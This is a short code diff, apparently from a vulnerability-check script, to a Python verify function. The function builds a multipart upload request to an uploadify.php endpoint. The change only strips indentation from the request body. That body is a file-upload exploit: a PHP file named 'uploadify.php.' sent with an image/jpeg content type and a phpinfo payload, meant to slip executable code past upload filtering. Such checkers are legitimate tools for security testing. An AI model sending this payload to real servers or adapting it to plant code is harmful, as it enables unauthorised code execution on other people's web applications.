@@ -20,12 +20,12 @@ def verify(url):
         'Connection': 'close',
     }
     data = '''
-        ------WebKitFormBoundarydRVCGWq4Cx3Sq6tt
-        Content-Disposition: form-data; name="Fdiledata"; filename="uploadify.php."
-        Content-Type: image/jpeg
-         
-        <?php phpinfo();?>
-        ------WebKitFormBoundarydRVCGWq4Cx3Sq6tt
+------WebKitFormBoundarydRVCGWq4Cx3Sq6tt
+Content-Disposition: form-data; name="Fdiledata"; filename="uploadify.php."
+Content-Type: image/jpeg
+ 
+<?php phpinfo();?>
+------WebKitFormBoundarydRVCGWq4Cx3Sq6tt
     '''
     vurl = urllib.parse.urljoin(url, "/inc/jquery/uploadify/uploadify.php")
     try:
